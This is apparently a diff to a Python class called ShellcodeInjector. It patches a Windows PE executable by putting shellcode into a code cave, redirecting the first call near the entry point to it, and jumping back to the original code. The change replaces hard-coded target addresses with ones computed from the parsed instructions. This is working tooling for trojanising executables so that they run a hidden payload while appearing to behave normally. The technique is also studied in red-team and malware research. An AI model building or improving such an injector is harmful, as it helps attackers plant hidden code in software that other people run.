@@ -111,11 +111,7 @@ class ShellcodeInjector:
         entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
         print_debug(f"Original entry point: {hex(entry_point)}")
         call_func_to_overwrite = self.pe_parser.find_first_instruction("call", section_name, entry_point)
-
-        # Backup original bytes
-        original_bytes_overwritten = self.pe_parser.read_bytes(call_func_to_overwrite['address'], 5,
-                                                               section_name)
-        self.pe_parser.print_instructions(call_func_to_overwrite['address'], 5, section_name)
+        jmp_func_to_overwrite = self.pe_parser.find_first_instruction("jmp", section_name, entry_point)
 
         # Calculate addresses
         cave_rva = best_cave[0] - best_section.VirtualAddress
@@ -129,7 +125,8 @@ class ShellcodeInjector:
         # Calculate the relative offset for the CALL instruction
 
         call_target = best_cave[0] + len(protected_shellcode)
-        target_address = 0x00001164
+        target_address = self.pe_parser.extract_offset_and_calculate_target(call_func_to_overwrite['bytes'], call_func_to_overwrite['address'])
+        
 
         # Calculate the relative offset for the call instruction from call_target to target_address
         # The offset should be: target_address - (call_target + length_of_CALL_instruction)
@@ -145,7 +142,8 @@ class ShellcodeInjector:
 
         # Prepare return jump to original entry
         jmp_target = best_cave[0] + len(protected_shellcode)
-        target_address = 0x000014c0
+        target_address = self.pe_parser.extract_offset_and_calculate_target(jmp_func_to_overwrite['bytes'], jmp_func_to_overwrite['address'])
+        # target_address = 0x000014c0
 
         next_instruction_address = jmp_target + 5  # Length of the CALL instruction is 5 bytes
         jmp_distance = target_address - next_instruction_address
